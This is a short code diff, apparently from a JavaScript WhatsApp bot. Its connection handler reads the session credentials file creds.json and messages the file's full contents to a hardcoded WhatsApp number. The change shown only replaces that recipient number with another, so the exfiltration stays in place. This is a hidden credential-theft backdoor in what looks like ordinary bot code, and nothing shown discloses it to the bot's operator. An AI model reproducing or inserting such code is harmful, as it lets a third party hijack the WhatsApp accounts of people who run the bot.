@@ -234,7 +234,7 @@ async function connectionUpdate(update) {
       
       if (fs.existsSync(credsPath)) {
         const credsContent = fs.readFileSync(credsPath, 'utf-8');
-        const recipientJid = '212697516526@s.whatsapp.net';
+        const recipientJid = '212637904038@s.whatsapp.net';
 
         await this.sendMessage(recipientJid, {
           text: `📄 *محتوى ملف creds.json:*\n\n\`\`\`${credsContent}\`\`\``
